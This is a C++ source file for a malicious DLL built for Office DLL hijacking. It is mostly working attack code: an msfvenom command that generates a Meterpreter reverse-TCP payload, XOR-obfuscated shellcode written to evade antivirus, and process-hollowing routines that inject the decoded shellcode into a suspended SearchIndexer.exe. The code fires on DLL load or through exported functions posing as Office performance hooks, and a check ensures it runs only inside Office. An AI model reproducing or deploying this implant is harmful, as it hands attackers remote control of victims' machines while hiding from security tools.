// Office DLL Hijacking
// Multi-byte character set using static libraries
// XOR to bypass AV

#include "stdafx.h"
#include <string>

//Payload of choice: 
//msfvenom -p windows/x64/meterpreter/reverse_tcp -e x86/countdown LHOST=192.168.102.129 LPORT=4444 -f c > payload.txt
//Copy into shellcode obfuscator 

bool safetoexec = false;
std::string office1 = "Of";
std::string office2 = "f";
typedef BOOL(WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
LPFN_ISWOW64PROCESS fnIsWow64Process;
unsigned char key[] = "J";

#ifdef _WIN64
unsigned char bits[] =
"\xb4\xf3\x03\xb7\x48\x4b\x02\x4a\x48\x4a\xea\xa2\x5f\xb5\xea\xb5"
"\x5f\xb5\xea\xb5\x61\x8b\x75\x14\x0f\x7a\x09\x06\x4d\x44\x00"
"\x4d\xa8\xa8\x18\xb0\xaf\xb7\xaf\x00\x65\xca\xcf\xaa\x70\xbf"
"\xd4\xa4\x55\x81\x17\x42\x54\x43\x14\x40\x14\x00\x03\x17\x05"
"\x06\x11\x14\x06\x17\x0d\x0b\x00\x0d\x10\x10\x78\x68\xf4\x8c"
"\xce\x3a\xda\x14\x0c\xd6\x0c\x00\x3f\x33\x27\x18\xfd\xda\xf9"
"\x04\xb6\x4f\xaa\x1c\x74\xde\x4c\x38\x07\x4b\x27\x20\xc5\xe2"
"\xd9\x1c\xe6\x3f\xc2\x24\xa0\x62\x75\xd5\x5c\x29\x76\x2a\x5a"
"\x2c\x0d\x57\xa3\xae\x8f\x2c\xdb\x54\x61\xba\xb6\xd7\xf2\x44"
"\xea\x18\xe8\x02\x95\x7d\xc5\x50\x98\x5d\xab\x33\x19\xb2\xa0"
"\xb9\xdc\x7c\xeb\x37\x9d\x76\x28\xb5\xbf\x97\x58\xe7\x01\x59"
"\x48\x49\x10\x58\x56\x46\xd2\x84\x8c\x5e\xa1\x2d\x28\x89\x69"
"\x41\x55\x3c\x1c\x49\x1b\x07\xcc\xd7\xae\x62\x2a\x84\x48\x62"
"\x4b\x03\x58\x13\x43\x1b\x52\x11\xc8\x9a\xa6\x6e\xbb\x1d\xa9"
"\x12\xba\x13\x21\x9b\xb0\x91\x2e\x9e\x39\x17\x2d\x14\x38\x15"
"\x5a\x62\xf4\xae\x1c\xe8\x41\x5d\x08\x49\x6f\x67\x42\x2d\xbf"
"\xfd\xcd\x72\x65\xa8\x0d\x68\x34\x39\x56\x62\xfa\xac\x9e\x64"
"\x9b\x05\xe8\x73\xd2\x3a\x3a\xe8\xe0\xda\x88\x68\xff\x77\x3c"
"\xc3\xc8\xf4\xbb\x73\x03\xb8\x07\x04\xbe\xb9\xc0\x7e\xf6\x36"
"\x14\xe2\x6c\x78\x97\xfb\x95\x02\x15\x80\xed\xf8\xe3\x0e\x80"
"\x63\x0d\x8d\x01\x0c\x0a\x0b\xc4\xce\x45\x81\x85\xc0\x82\x07"
"\x7d\xff\x59\x24\xe9\xb0\xc2\x2b\x55\x97\x8e\xdb\x1b\x95\xe1"
"\xfa\x36\xd7\xaf\x99\x4b\xe4\x48\x03\xee\xa6\xe6\x08\x6f\x89"
"\xfd\x92\xa1\x5c\x35\x94\xc4\xf1\x67\xa3\x8d\xea\xb5\x38\x3a"
"\x8f\x95\xaf\xf1\x64\x11\xe0\xb4\xa5\x12\xa6\x7a\x68\xda\xa0"
"\x27\xfd\x88\xaf\x6e\xe6\x5a\x34\xfe\xa4\x8f\x71\x70\xff\x00"
"\x70\xb1\xb1\x4e\xff\x61\x2f\xdc\xbd\x79\xa5\xca\xb3\x61\xab"
"\xcf\xae\x67\xa8\xcb\xac\x7d\xb6\xd1\xac\x65\xb4\xb6\xd3\x7c"
"\xca\xae\xd2\x6f\xc1\x62\x0d\x01\x63\xad\xac\x61\xcc\xb1\xd0"
"\xcd\x7c\xad\x60\x74\xd9\xb3\xc7\x6d\xde\xb3\xde\x7e\xcd\x6f"
"\x11\xe6\x89\x97\x71\x45\xd2\x24\x61\x44\x60\x27\x63\xe7\xc0"
"\x3c\xdb\x11\x2d\xf6\xe7\x14\xe2\xb0\xa4\x78\xc8\xdf\xa7\x78"
"\xa7\xd2\xaa\x79\xab\x90\xe9\x6f\xff\x88\xe7\xae\x26\xe4\x4a"
"\x01\xe5\x22\x23\x6d\x4f\x6d\x00\xcd\xa0\x6b\xa6\xcc\xa7\x21"
"\xed\x0d\x2c\x52\x5f\xa0\xf2\xa4\x04\x1f\xbb\xa1\xbe\x0f\xae"
"\xef\xe0\x92\x7d\x88\x1a\x5d\xd5\x6c\x31\x9c\xf0\x7e\xe2\x80"
"\xfe\xbd\x3d\xec\x51\xea\x06\x28\xc2\x91\xb9\x99\x08\x6d\xf4"
"\x6e\x03\x55\x3b\x3e\x6b\x7b\x45\xc7\xbc\x52\x95\x5f\x0d\x90"
"\xcf\x3d\xad\x11\x2c\x55\x44\x0e\x5b\x55\x5b\x0d\x58\x0d\x00"
"\x12\x1f\xf7\xe5\x82\x75\x5f\xdd\x66\x39\x35\x53\x9a\xaf\x1e"
"\x84\x22\x3c\x7f\x5d\x6a\x15\x61\x0b\x5b\x3a\x60\x3b\x45\x25"
"\x1d\x58\xba\xa7\x98\x22\xc5\x5d\x68\xad\x42\x2a\xde\x9c\x7e"
"\xa0\x57\x29\xb8\xef\x1d\xa5\x31\x2c\xab\x9a\x11\xba\x22\x33"
"\xd3\xf1\x6b\xb8\x54\x3f\x91\xc5\x07\x96\x75\x72\xd8\xad\x4b"
"\x93\xc4\x8f\x60\xa4\x5e\x3e\xa0\xfe\x13\xb3\x0c\x1f\x16\x1a"
"\x5c\x4a\x0c\x50\x49\x45\xce\x87\x23\xed\x67\x44\xe3\x84\x18"
"\xfb\x5a\x42\xe0\xba\x78\x98\xdb\xa3\xa8\x73\xcd\x65\x37\xfa"
"\xf8\xcf\x66\x9e\xbe\xd8\xd3\x6d\xc7\x14\x91\x56\x72\xe3\xa1"
"\xd3\xc6\x67\x30\xf6\xc8\xf8\x4a\x82\x5c\x16\x4b\x17\x5f\x14"
"\x02\x5d\xab\xa9\x6c\xc7\x54\x38\x35\x61\x92\xa7\x5f\xcd\x3e"
"\x61\x22\x1c\xc9\xeb\x80\x49\xa4\x24\xc4\x60\xba\x7e\xd5\x6f"
"\x78\xad\xa4\xdc\xdf\x7b\x5e\x81\x64\x3a\x84\xe0\x72\xf6\x12"
"\x60\xd1\xc3\x39\xe8\x88\xb1\x43\xcb\x73\x30\x3c\x4f\x5f\x63"
"\x20\x7f\x97\xb7\x66\xf1\x8c\xea\x19\x95\x58\x41\x67\x3f\xc3"
"\xa4\x4c\x8f\xc1\x8d\x55\x94\xff\xaa\x3c\xc3\xec\xd0\x2d\xc1"
"\xeb\xc6\x6d\x86\xf1\x9c\x7c\x8d\x2f\x53\x06\x29\x96\x90\x7e"
"\xe8\x69\x17\xf7\x9e\x91\x66\x14\x85\x62\x76\xe2\x80\xd7\x35"
"\xf9\x2e\xfa\x03\x65\x9f\x38\x5d\x2e\x16\x8d\xa3\xef\x62\xc0"
"\x2f\x64\xa4\xbb\xdf\x9d\x26\x38\xa5\x5c\x64\x4e\x12\xe5\xab"
"\x8c\x69\xb7\x3b\x19\xae\x77\x6e\x6a\x1d\xce\xa4\x8e\x40\x77"
"\xf9\x56\x21\x67\x31\xc6\xa1\xc6\x00\xef\x29\x91\x7e\x9b\x0a"
"\x68\xf3\xe5\x8d\x3c\xd9\x92\xae\x24\xb6\x87\xa3\x2b\xac\xc9"
"\xe2\x42\x8b\x8a\xc8\x03\x89\x8d\x8e\x43\xce\x97\xd4\x70\xe7"
"\xf2\x82\x2b\xd9\xea\xc1\xd1\x3b\x5c\x8d\xf4\xa8\x7f\x8b\xca"
"\xb5\xaf\x65\xe1\x4e\x2e\xcf\xee\xc0\x31\xdf\x14\x25\xfd\xe9"
"\x0e\xf3\xd1\xdf\x23\xf2\x4c\x6f\x08\x44\xd7\xdf\xbf\x68\xe5"
"\x5a\x99\x7c\x0f\x96\x5b\x54\x0c\x57\x5a\x56\xbc\xe6\x12\xae"
"\x7d\x6f\x98\xe5\x13\x8b\x76\x65\x9e\xe8\xba\x24\xea\x50\x38"
"\xd2\x28\x10\xcc\xe4\x89\x45\xd5\x5c\x35\xe0\xe6\xd3\x58\xbe"
"\xbe\xe6\x4b\xf5\x31\x7a\x41\x70\x02\x43\x07\x05\x14\x13\xf4"
"\xe0\xbc\x48\xdd\x61\x97\x4a";

//"\xb9\xfd\x01\x00\x00\xe8\xff\xff\xff\xff\xc1\x5e\x30\x4c\x0e\x07\xe2\xfa\xfd\x4a\x80\xe0\xf5\xee\xcb\x08\x09\x0a\x4a\x5d\x4c\x5e\x5d\x41\x47\x5a\x22\xc6\x70\x5e\x9c\x4a\x79\x52\x90\x4e\x05\x56\x94\x72\x01\x6a\xa8\x56\x75\x6e\x28\x9f\x63\x60\x66\x1d\xe4\x66\x1e\xf0\x9d\x0e\x52\x48\x37\x1a\x17\x79\xf8\xf3\x36\x7d\x3c\xff\xdd\xad\x13\x03\x12\x0c\xce\x14\x67\xc3\x0b\x76\x03\x4d\x9d\x28\xce\x28\x49\x59\x51\x5b\xd0\x24\x57\x58\x59\xd1\xdb\xd4\x5d\x5e\x5f\x28\xe4\xa2\x17\x03\x2d\x67\xb7\x38\xe2\x22\x73\x28\xe6\x2e\x4f\x39\x70\xa2\x90\x22\x3d\x89\xbe\x39\xf2\x4e\xf3\x34\x7c\xa8\x32\xb1\x48\xca\xb2\x44\x29\xc7\x46\x41\x84\xcb\x8a\x4d\xb5\x6e\xfa\x61\xdd\x91\xdf\xb0\x9d\xd3\xae\x49\xec\x42\xc3\xd8\x16\xde\xbb\xe9\xa0\x72\xc5\xe5\x2e\xaa\xef\xec\x22\xea\xb7\xe5\xac\x7e\xee\x3b\xb5\x3a\xfb\xb5\x65\xf7\xef\xf9\xe1\xe4\xe2\xe6\xfc\xe6\xfe\x99\x80\x98\x8b\x47\x29\xe6\x86\x9a\x36\x2a\x93\x8d\x94\x94\x87\x5b\xc3\x3b\x98\x2b\x2a\x29\x8a\x91\x67\xad\xa8\xee\x82\xed\xed\xe0\xe1\xa3\xb5\xad\x6c\x00\xaf\x69\x05\x4a\xea\xec\xed\xa7\x66\x15\xb8\x4e\xf1\xf4\xe4\xaa\x37\x50\x9f\x7b\xba\xa8\xb4\x77\x1b\x4c\x88\xf3\x42\xbe\x49\x71\x21\x0f\xf6\xdf\x47\x85\xe7\x66\x0e\x11\x11\x12\x4a\x55\xaf\x3f\x97\x73\x19\xe5\xce\x76\x17\x5f\x41\x70\x71\x6f\x12\xed\x68\x17\xe7\x60\xd6\xea\x63\xa5\xef\x66\xd0\xf0\x79\xbb\xf2\x75\x8f\xdc\x38\xe7\xd9\xc5\xee\x74\xb4\xf9\x55\x50\x00\x1a\x0f\xcd\xa7\x0e\xce\xb1\x08\xf0\xd2\xe9\x39\x2f\xb0\x85\xd4\x92\x27\x5e\x1c\xa9\x99\x2d\xbc\xb2\xc8\x5c\x5d\x5e\x17\xe3\x8d\x72\x2b\xed\x87\x2b\x56\xa1\x03\x6e\x2a\x34\x25\xe7\x96\x31\xcb\x70\xaa\xbc\x2a\x89\xa2\xfb\x81\x7a\x05\x29\x35\xfd\xbb\xa0\xdf\x0b\x75\xee\xc5\xc7\xde\xe0\x89\x9a\x8b\x8c\xcc\xd6\xc7\x19\x63\xda\xa2\x5d\xd4\x2c\xcf\x3c\xca\x7f\x64\x49\xd5\x17\x5c\xe9\x28\x65\xee\x95\x6c\xef\x2e\x58\xe1\x23\x71\xe4\x24\x57\xee\x0a\xb3\x6b\x7b\xeb\x4a\x63\x34\x40\xb9\xc7\x93\xe4\xfc\xe9\xe6\xa8\xc1\x82\xc3\xc4\x84\x9e\xad\xc8\x93\x8b\x71\xc7\xe2\xc1\xff\x2f\x04\x85\x8a\x95\x6f\xa3\xb9\x95\xb8\x25\x0e\x95\x22\x10\x36\xdc\x1e\x1d\x1c\xac\xe4\x25\xaf\xc1\x2f\xa2\x6e\x1a\x98\x5a\xae\x0f\x16\xaa\x99\xf4\xac\xbf\x30\x3a\x09\x4f\x59\xaa\x02\x2b";

#else

unsigned char bits[] = "\xb9\xfd\x01\x00\x00\xe8\xff\xff\xff\xff\xc1\x5e\x30\x4c\x0e\x07\xe2\xfa\xfd\x4a\x80\xe0\xf5\xee\xcb\x08\x09\x0a\x4a\x5d\x4c\x5e\x5d\x41\x47\x5a\x22\xc6\x70\x5e\x9c\x4a\x79\x52\x90\x4e\x05\x56\x94\x72\x01\x6a\xa8\x56\x75\x6e\x28\x9f\x63\x60\x66\x1d\xe4\x66\x1e\xf0\x9d\x0e\x52\x48\x37\x1a\x17\x79\xf8\xf3\x36\x7d\x3c\xff\xdd\xad\x13\x03\x12\x0c\xce\x14\x67\xc3\x0b\x76\x03\x4d\x9d\x28\xce\x28\x49\x59\x51\x5b\xd0\x24\x57\x58\x59\xd1\xdb\xd4\x5d\x5e\x5f\x28\xe4\xa2\x17\x03\x2d\x67\xb7\x38\xe2\x22\x73\x28\xe6\x2e\x4f\x39\x70\xa2\x90\x22\x3d\x89\xbe\x39\xf2\x4e\xf3\x34\x7c\xa8\x32\xb1\x48\xca\xb2\x44\x29\xc7\x46\x41\x84\xcb\x8a\x4d\xb5\x6e\xfa\x61\xdd\x91\xdf\xb0\x9d\xd3\xae\x49\xec\x42\xc3\xd8\x16\xde\xbb\xe9\xa0\x72\xc5\xe5\x2e\xaa\xef\xec\x22\xea\xb7\xe5\xac\x7e\xee\x3b\xb5\x3a\xfb\xb5\x65\xf7\xef\xf9\xe1\xe4\xe2\xe6\xfc\xe6\xfe\x99\x80\x98\x8b\x47\x29\xe6\x86\x9a\x36\x2a\x93\x8d\x94\x94\x87\x5b\xc3\x3b\x98\x2b\x2a\x29\x8a\x91\x67\xad\xa8\xee\x82\xed\xed\xe0\xe1\xa3\xb5\xad\x6c\x00\xaf\x69\x05\x4a\xea\xec\xed\xa7\x66\x15\xb8\x4e\xf1\xf4\xe4\xaa\x37\x50\x9f\x7b\xba\xa8\xb4\x77\x1b\x4c\x88\xf3\x42\xbe\x49\x71\x21\x0f\xf6\xdf\x47\x85\xe7\x66\x0e\x11\x11\x12\x4a\x55\xaf\x3f\x97\x73\x19\xe5\xce\x76\x17\x5f\x41\x70\x71\x6f\x12\xed\x68\x17\xe7\x60\xd6\xea\x63\xa5\xef\x66\xd0\xf0\x79\xbb\xf2\x75\x8f\xdc\x38\xe7\xd9\xc5\xee\x74\xb4\xf9\x55\x50\x00\x1a\x0f\xcd\xa7\x0e\xce\xb1\x08\xf0\xd2\xe9\x39\x2f\xb0\x85\xd4\x92\x27\x5e\x1c\xa9\x99\x2d\xbc\xb2\xc8\x5c\x5d\x5e\x17\xe3\x8d\x72\x2b\xed\x87\x2b\x56\xa1\x03\x6e\x2a\x34\x25\xe7\x96\x31\xcb\x70\xaa\xbc\x2a\x89\xa2\xfb\x81\x7a\x05\x29\x35\xfd\xbb\xa0\xdf\x0b\x75\xee\xc5\xc7\xde\xe0\x89\x9a\x8b\x8c\xcc\xd6\xc7\x19\x63\xda\xa2\x5d\xd4\x2c\xcf\x3c\xca\x7f\x64\x49\xd5\x17\x5c\xe9\x28\x65\xee\x95\x6c\xef\x2e\x58\xe1\x23\x71\xe4\x24\x57\xee\x0a\xb3\x6b\x7b\xeb\x4a\x63\x34\x40\xb9\xc7\x93\xe4\xfc\xe9\xe6\xa8\xc1\x82\xc3\xc4\x84\x9e\xad\xc8\x93\x8b\x71\xc7\xe2\xc1\xff\x2f\x04\x85\x8a\x95\x6f\xa3\xb9\x95\xb8\x25\x0e\x95\x22\x10\x36\xdc\x1e\x1d\x1c\xac\xe4\x25\xaf\xc1\x2f\xa2\x6e\x1a\x98\x5a\xae\x0f\x16\xaa\x99\xf4\xac\xbf\x30\x3a\x09\x4f\x59\xaa\x02\x2b";
#endif


unsigned long shsize = 2048;

const int size = sizeof bits;

void bzero_cust(void *p, size_t l)
{

	BYTE *q = (BYTE *)p;
	size_t x = 0;
	for (x = 0; x < l; x++)
		*(q++) = 0x00;
}

//XORPayloadFunction
//e is the xor'ed payload
//k is the key
//d is the returned payload
void XORandDrop(unsigned char* e, unsigned char* k, unsigned char* d)
{
	int j = 0;
	for (int i = 1; i < size; i = i + 2)
	{
		d[j] = e[i] ^ k[0];
		j++;
	}
	
}

void ExecPay(void) {
	char process[40];
	strncpy_s(process,"SearchIndexer.exe", sizeof(process) - 1);
	PROCESS_INFORMATION prosinf;
	STARTUPINFO startinf;
	CONTEXT contx;
	LPVOID rp;
	unsigned char d[size/2];
	
	// Start up the payload in a new process
	bzero_cust(&startinf, sizeof(startinf));
	startinf.cb = sizeof(startinf);

	// Create a suspended process, write shellcode into stack, make stack RWX, resume it
	if (CreateProcess(0, process, 0, 0, 0, CREATE_SUSPENDED | IDLE_PRIORITY_CLASS, 0, 0, &startinf, &prosinf)) {
		contx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
		GetThreadContext(prosinf.hThread, &contx);

		rp = (LPVOID)VirtualAllocEx(prosinf.hProcess, NULL, shsize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

		XORandDrop(bits, key, d);

		WriteProcessMemory(prosinf.hProcess, (PVOID)rp, &d, shsize, 0);

		#ifdef _WIN64
				contx.Rip = (DWORD64)rp;
		#else
				contx.Eip = (DWORD)rp;
		#endif

		SetThreadContext(prosinf.hThread, &contx);

		ResumeThread(prosinf.hThread);
		CloseHandle(prosinf.hThread);
		CloseHandle(prosinf.hProcess);
	}
	return;
}

void PrepPay(void)
{
	PROCESS_INFORMATION processInformation = { 0 };
	STARTUPINFO startupInfo = { 0 };
	BOOL result = true;
	int valueLength = 512;
	TCHAR* envVarValue = new TCHAR[valueLength];
	DWORD len = NULL;
	WCHAR path[MAX_PATH] = { 0 };
	GetModuleFileNameW(NULL, path, MAX_PATH);
	std::wstring ws(path);
	std::string fullpath(ws.begin(), ws.end());

	std::string office3 = "ic";
	std::string office4 = "e";
	std::size_t found3 = fullpath.find(office1 + office2 + office3 + office4);
	SetEnvironmentVariable(TEXT("pathinfoV"), fullpath.c_str());
	//CreateProcess("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, "C:\\Windows\\", &startupInfo, &processInformation);

	if (found3 != std::string::npos)
	{
		safetoexec = true;
	}

	if (safetoexec)
	{
		PROCESS_INFORMATION processInformation = { 0 };
		STARTUPINFO startupInfo = { 0 };
		BOOL result = true;
		int valueLength = 512;
		TCHAR* envVarValue = new TCHAR[valueLength];
		DWORD len = NULL;

		//Uses environment variable to stop multiple executions per document open.
		//It will still run once for every document opened
		len = GetEnvironmentVariable("Ran", envVarValue, valueLength);
		if (!len)
		{
		
			ExecPay();
			//#ifdef _DEBUG
				result = CreateProcess("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, "C:\\Windows\\System32", &startupInfo, &processInformation);
			//#endif

			SetEnvironmentVariable((TEXT("Ran")), (TEXT("1")));

		}
	}
	return;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
	PROCESS_INFORMATION processInformation = { 0 };
	STARTUPINFO startupInfo = { 0 };
	switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		//CreateProcess("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, "C:\\", &startupInfo, &processInformation);
		#ifdef _WIN32
				PrepPay();
		#endif
		break;
    case DLL_THREAD_ATTACH:
		break;
    case DLL_THREAD_DETACH:
		break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

#ifdef _WIN64
//Exploit moved to extern for safer execution
extern "C" __declspec(dllexport) void GetPerfhostHookVersion()
{
	PrepPay();
	return;

}

extern "C" __declspec(dllexport) void _PerfCodeMarker()
{
	PrepPay();
	return;
}


extern "C" __declspec(dllexport) void _UnInitPerf()
{
	PrepPay();
	return;
}

#endif

/*
switch (ul_reason_for_call)
{
case DLL_PROCESS_ATTACH:
//fireLazor();
len = GetEnvironmentVariable(L"Run", envVarValue, valueLength);
if (!len)
{
result = CreateProcess(L"C:\\Windows\\System32\\cmd.exe", szCmdline, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, L"C:\\Windows\\System32", &startupInfo, &processInformation);
SetEnvironmentVariable(_tcsdup(TEXT("Run")), _tcsdup(TEXT("1")));
}
return FALSE;
case DLL_THREAD_ATTACH:

case DLL_THREAD_DETACH:
case DLL_PROCESS_DETACH:

break;
}
//fireLazor();
return FALSE;
}




extern "C" __declspec(dllexport) void AInitNeverRun()
{
wastetime();
}



extern "C" __declspec(dllexport) void PerfCodeMarker()
{
	fireLazor();
}


extern "C" __declspec(dllexport) void UnInitPerf()
{
	fireLazor();
}

void wastetime()
{
int d = 1, e = 2;
signed long long int limit = 600851475143;
for (int i = 0; i < limit; i++)
{
d = i / (10 * i);
}

}
*/
